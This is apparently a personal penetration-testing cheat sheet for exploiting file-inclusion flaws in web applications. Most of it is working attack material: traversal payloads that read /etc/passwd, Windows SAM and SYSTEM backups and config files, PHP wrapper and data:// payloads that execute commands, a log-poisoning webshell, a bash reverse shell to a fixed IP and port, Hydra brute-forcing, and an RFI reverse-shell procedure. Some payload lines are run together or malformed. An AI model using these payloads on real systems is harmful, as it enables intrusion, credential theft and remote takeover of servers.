LFI : Minimum no. of correct escapes (../) helps to retrieve file
/usr/share/seclists/Fuzzing/LFI

## LFI
/usr/share/seclists/Fuzzing/LFI  
while fuzzing using ffuf don’t forget to add admin session cookie and grep passwd for linux  
http://ip.com/test.php?Fuzz=/etc/passwd  
http://ip.com/test.php?file=fuzz (pathotest.txt)

### READ /etc/passwd & 22 OPEN ?
try hydra brute force for those usernames

### Port Knocking ? 
Try to do port knocking by reading knock file
location knock file /etc/init.d/knockd
```
sudo apt install knockd
```
run knock
```
knock IP port port port
```

### SAMBA There ? 
Look for 
/export/samba/secure/smbpasswd.bak and /etc/samba/smb.conf

ASSERTION PAYLOADS AND OTHER TRICKS 
https://book.hacktricks.xyz/pentesting-web/file-inclusion

### Bypass
#### Url Encoding 
php Filters 
```
php:// for getting b64 output, data:\\ for RCE or rev shell
```
Checking whether php wrappers are working
```
php://filter/resource=admin.php
php://filter/convert.base64-encode/resource=admin.php
```
Direct RCE if log poisoning didn’t work checking if data wrappers work
```
data://text/plain,<?php%20echo%20system('ls');?>
echo -n '<?phpechosystem($_GET["cmd"]);?>' | base64
data:text/plain,<?php echo shell_exec("bash/tmp/reverse.sh");?>data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```
**/etc/passwd** (base-64-encoded as `L2V0Yy9wYXNzd2Q=`)which becomes
```
http://192.168.120.121:8080/data/L2V0Yy9wYXNzd2Q=:
```
Seperate Users from /etc/passwd
```
cut -d ":" -f1 sshUsers2
```
Reference : https://github.com/takabaya-shi/LFI2RCE

### Log Poisoning
- Try to read /var/log/apache2/access.log (Linux) or C:\xampp\apache\logs \access.log (Windows)
- Worked? log poisoning possible
- Add this <?phpechosystem($_GET['cmd']);?> in User-Agent Burpsuite
- RCE via &cmd=
(Bourne Shell)
```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
Notes : (Bash or Sh rev shell wont work since code is executing via php system func)

**Notes** : NOT ALWAYS LFI CAN BE USED TO GET REVSHELL DIRECTLY USING LOG POISONING OR VIA RFI.

### Windows 
```
C:\Program%20Files\FileZilla%20Server\FileZilla%20Server.xml
```

```
..%5C..%5C..%5C..%5C..%5C..%5C/Windows/System32/config/RegBack/SYSTEM.OLD
```

```
..%5C..%5C..%5C..%5C..%5C..%5C/Windows/System32/config/RegBack/SAM.OLD
```

```
..\..\..\..\..\..\..\..\..\xampp\security\webdav.htpasswd
```

```
..\..\..\..\..\..\..\..\xampp\htdocs\blog\wp-config.php
```

## RFI
host php-reverse-shell.php using python server
enter url in parameter after listening netcat
Shell